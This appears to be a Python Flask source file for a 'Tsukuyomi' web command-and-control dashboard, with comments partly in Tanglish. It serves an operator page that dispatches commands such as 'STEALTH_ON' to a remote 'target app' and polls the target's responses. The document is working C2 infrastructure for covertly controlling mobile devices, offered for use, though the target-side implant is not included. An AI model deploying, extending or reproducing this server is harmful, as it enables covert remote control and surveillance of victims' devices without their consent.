from flask import Flask, jsonify, render_template_string, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."

# HTML UI-a direct-ah serve panra route (Unga provided HTML code inga irukum)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tsukuyomi Mobile Admin Framework</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(18, 24, 36, 0.75); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
        @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
    </style>
</head>
<body class="min-h-screen p-4 flex flex-col items-center">
    <div class="w-full max-w-2xl glass-panel p-6 rounded-2xl space-y-6">
        <div class="flex justify-between items-center border-b border-slate-800 pb-4">
            <h1 class="text-lg font-bold font-mono text-cyan-400">TSUKUYOMI WEB C2 DASHBOARD</h1>
            <span class="px-2.5 py-1 bg-green-500/10 text-green-400 text-xs font-mono rounded border border-green-500/30 pulse-live">ONLINE</span>
        </div>
        
        <div class="space-y-3 font-mono text-sm">
            <label class="text-slate-400">Send Command to Target App:</label>
            <div class="flex space-x-2">
                <input type="text" id="cmdInput" placeholder="e.g., STEALTH_ON, SHOW_TOAST" class="flex-1 bg-slate-900 border border-slate-700 px-4 py-2.5 rounded-xl text-white focus:outline-none focus:border-cyan-400">
                <button onclick="sendCommand()" class="px-5 py-2.5 bg-cyan-400 text-slate-950 font-bold rounded-xl hover:bg-cyan-300 transition">Dispatch</button>
            </div>
        </div>

        <div class="space-y-2 font-mono">
            <span class="text-xs text-slate-400 uppercase tracking-wider">Target Live Response Feed:</span>
            <div id="responseBox" class="h-40 bg-slate-950 p-4 rounded-xl border border-slate-800 text-xs text-green-400 overflow-y-auto">
                Waiting for target telemetry...
            </div>
        </div>
    </div>

    <script>
        async function sendCommand() {
            const cmd = document.getElementById('cmdInput').value;
            if(!cmd) return;
            
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            const data = await res.json();
            addLog(`[DISPATCHED] -> ${data.command}`, 'text-cyan-400');
        }

        async function pollResponse() {
            try {
                const res = await fetch('/api/response');
                const data = await res.json();
                if(data.response) {
                    document.getElementById('responseBox').innerHTML += `<p class="text-slate-200">[TARGET] ${data.response}</p>`;
                }
            } catch(e) {}
        }
        setInterval(pollResponse, 3000);

        function addLog(text, colorClass) {
            const box = document.getElementById('responseBox');
            box.innerHTML += `<p class="${colorClass}">${text}</p>`;
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
"""


@app.route("/")
def home():
  return render_template_string(HTML_TEMPLATE)


@app.route("/api/command", methods=["GET", "POST"])
def handle_command():
  global current_command
  if request.method == "POST":
    data = request.get_json()
    current_command = data.get("command", "")
    return jsonify({"status": "success", "command": current_command})
  cmd = current_command
  current_command = ""
  return jsonify({"command": cmd})


@app.route("/api/response", methods=["GET", "POST"])
def handle_response():
  global latest_response
  if request.method == "POST":
    data = request.get_json()
    latest_response = data.get("response", "")
    return jsonify({"status": "success"})
  return jsonify({"response": latest_response})


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)
    
